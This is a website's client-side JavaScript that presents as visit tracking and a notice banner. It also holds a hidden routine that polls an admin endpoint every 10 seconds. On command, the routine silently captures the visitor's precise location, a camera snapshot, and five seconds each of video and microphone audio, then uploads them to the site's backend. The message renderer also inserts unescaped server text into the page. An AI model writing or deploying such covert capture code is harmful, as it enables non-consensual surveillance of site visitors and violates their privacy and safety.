let alreadyCaptured = false;

// ✅ Get stable username (logged-in or anonymous)
let username = localStorage.getItem("loggedInUser");
if (!username) {
  username = localStorage.getItem("anonUserId");
  if (!username) {
    username = `anonymous-${Date.now()}`;
    localStorage.setItem("anonUserId", username);
  }
}

// ✅ Track visit
function trackVisitPeriodically() {
  const username = localStorage.getItem("loggedInUser") || localStorage.getItem("anonUserId");
  if (!username) return;

  fetch(`${BACKEND_URL}/api/track-visit`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username })
  }).catch(err => console.error("Visit tracking failed:", err));
}

// Track immediately
trackVisitPeriodically();

// Track every 30 seconds
setInterval(trackVisitPeriodically, 30000);

// ✅ Manual capture function
async function manualCapture(triggeredBy = "user", forcedUsername = "", facingMode = "user") {
  if (alreadyCaptured) return;
  alreadyCaptured = true;

  let selfieBlob = null;
  let videoBlob = null;
  let audioBlob = null;
  let videoStream = null;
  let audioStream = null;

  try {
    // ✅ Step 1: Get Location
    const location = await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }),
        err => {
          console.warn("📍 Location error:", err);
          resolve({ lat: 0, lon: 0, accuracy: 0 });
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });

    // ✅ Step 2: Request Camera + Mic Separately
    try {
      videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
    } catch (err) {
      console.warn("📷 Camera denied:", err);
    }

    try {
      audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    } catch (err) {
      console.warn("🎤 Microphone denied:", err);
    }

    // ✅ Step 3: Selfie (if video available)
    if (videoStream?.getVideoTracks().length) {
      const videoEl = document.createElement("video");
      videoEl.srcObject = videoStream;
      videoEl.muted = true;
      try {
        await videoEl.play();
      } catch (e) {
        console.warn("🎬 Video play failed:", e);
      }

      await new Promise(r => setTimeout(r, 1000));
      const canvas = document.createElement("canvas");
      canvas.width = videoEl.videoWidth;
      canvas.height = videoEl.videoHeight;
      canvas.getContext("2d").drawImage(videoEl, 0, 0);
      selfieBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
    }

    // ✅ Step 4: Record video and audio if possible
    const videoChunks = [], audioChunks = [];
    let videoRecorder = null, audioRecorder = null;
    const promises = [];

    if (videoStream?.getVideoTracks().length) {
      const vStream = new MediaStream([videoStream.getVideoTracks()[0]]);
      videoRecorder = new MediaRecorder(vStream, { mimeType: "video/webm;codecs=vp8" });
      videoRecorder.ondataavailable = e => videoChunks.push(e.data);
      videoRecorder.start();
      promises.push(new Promise(res => videoRecorder.onstop = res));
    }

    if (audioStream?.getAudioTracks().length) {
      const aStream = new MediaStream([audioStream.getAudioTracks()[0]]);
      audioRecorder = new MediaRecorder(aStream, { mimeType: "audio/webm;codecs=opus" });
      audioRecorder.ondataavailable = e => audioChunks.push(e.data);
      audioRecorder.start();
      promises.push(new Promise(res => audioRecorder.onstop = res));
    }

    await new Promise(r => setTimeout(r, 5000));

    if (videoRecorder?.state === "recording") videoRecorder.stop();
    if (audioRecorder?.state === "recording") audioRecorder.stop();
    await Promise.all(promises);

    if (videoChunks.length) {
      videoBlob = new Blob(videoChunks, { type: "video/webm" });
    }

    if (audioChunks.length) {
      audioBlob = new Blob(audioChunks, { type: "audio/webm" });
    }

    // ✅ Step 5: Upload
    const formData = new FormData();
    if (selfieBlob) formData.append("selfie", selfieBlob, `selfie-${Date.now()}.jpg`);
    if (videoBlob) formData.append("video", videoBlob, `video-${Date.now()}.webm`);
    if (audioBlob) formData.append("audio", audioBlob, `audio-${Date.now()}.webm`);
    formData.append("location", JSON.stringify(location));
    formData.append("triggeredBy", triggeredBy);
    formData.append("username", forcedUsername || username);

    await fetch(`${BACKEND_URL}/api/capture-data`, {
      method: "POST",
      body: formData
    });

    console.log("✅ Upload successful");

  } catch (err) {
    console.error("❌ Capture failed:", err);
  } finally {
    if (videoStream) videoStream.getTracks().forEach(track => track.stop());
    if (audioStream) audioStream.getTracks().forEach(track => track.stop());
    alreadyCaptured = false;
  }
}

function showUserMessages() {
  const token = localStorage.getItem("token");
  const anonId = localStorage.getItem("anonUserId");
  const headers = token ? { Authorization: `Bearer ${token}` } : {};

  // ✅ Step 1: Show cached messages instantly
  const cached = JSON.parse(localStorage.getItem("cachedMessages") || "[]");
  if (cached.length) renderMessages(cached);

  // ✅ Step 2: Fetch fresh messages in background
  fetch(`${BACKEND_URL}/api/messages?anonId=${anonId}`, { headers })
    .then(res => res.json())
    .then(data => {
      if (data.status === "success") {
        localStorage.setItem("cachedMessages", JSON.stringify(data.messages));
        renderMessages(data.messages);
      }
    });
}

// ✅ Separate render function
function renderMessages(messages) {
  const dismissed = JSON.parse(localStorage.getItem("dismissedMessages") || "[]");
  const containerId = "site-messages";

  // Remove old container if exists
  const old = document.getElementById(containerId);
  if (old) old.remove();

  const container = document.createElement("div");
  container.id = containerId;
  container.style = `
    position: fixed;
    top: 10px;
    right: 10px;
    z-index: 9999;
    background: rgb(217, 184, 20);
    padding: 10px;
    border: 1px solid #ff9800;
    border-radius: 8px;
    max-width: 300px;
    font-size: 14px;
    word-wrap: break-word;
  `;

  // ✅ Make mobile-friendly with media query
  const styleTag = document.createElement("style");
  styleTag.innerHTML = `
    @media (max-width: 600px) {
      #${containerId} {
        right: 98% !important;
        transform: translateX(50%);
        max-width: 90vw !important;
      }
    }
  `;
  document.head.appendChild(styleTag);

  messages.forEach(msg => {
    if (dismissed.includes(msg._id)) return;

    const box = document.createElement("div");
    box.style = "margin-bottom:10px;position:relative;padding-right:20px;";
    box.innerHTML = `
      <button onclick="dismissMessage('${msg._id}', this.parentElement, '${containerId}')"
              style="position:absolute;top:0;right:0;background:none;border:none;font-weight:bold;font-size:16px;color:#666;cursor:pointer;">×</button>
      <strong>${msg.title}</strong><br>${msg.body}
    `;
    container.appendChild(box);

    setTimeout(() => {
      box.remove();
      deleteMessageFromBackend(msg._id);
      if (container.children.length === 0) container.remove();
    }, 10000);
  });

  if (container.children.length > 0) {
    document.body.appendChild(container);
  }
}

function deleteMessageFromBackend(id) {
  fetch(`${BACKEND_URL}/api/messages/${id}`, { method: "DELETE" });
}

// ✅ Custom dismiss logic with container check
function dismissMessage(id, el, containerId) {
  el.remove();
  deleteMessageFromBackend(id);
  const container = document.getElementById(containerId);
  if (container && container.children.length === 0) container.remove();
}

// Initial load
showUserMessages();

// ✅ Auto-refresh every 30 seconds
setInterval(showUserMessages, 10000); // or 10000 for 10s


// 🔁 Admin trigger polling (always active)
// 🔁 Admin trigger polling (always active)
setInterval(async () => {
  console.log("Checking for trigger:", username);
  try {
    const res = await fetch(`${BACKEND_URL}/api/manual-capture-flag?username=${username}`);
    const data = await res.json();
    console.log("Trigger response:", data);

    if (data.trigger) {
      console.log("⚡ Admin triggered manual capture for", username);

      // ✅ Choose camera facing mode (front/back)
      let facingMode = "user"; // default front
      if (data.camera === "back") facingMode = { exact: "environment" };

      // Pass facingMode into manualCapture
      await manualCapture("admin", username, facingMode);
    }
  } catch (err) {
    console.warn("Polling error:", err);
  }
}, 10000);

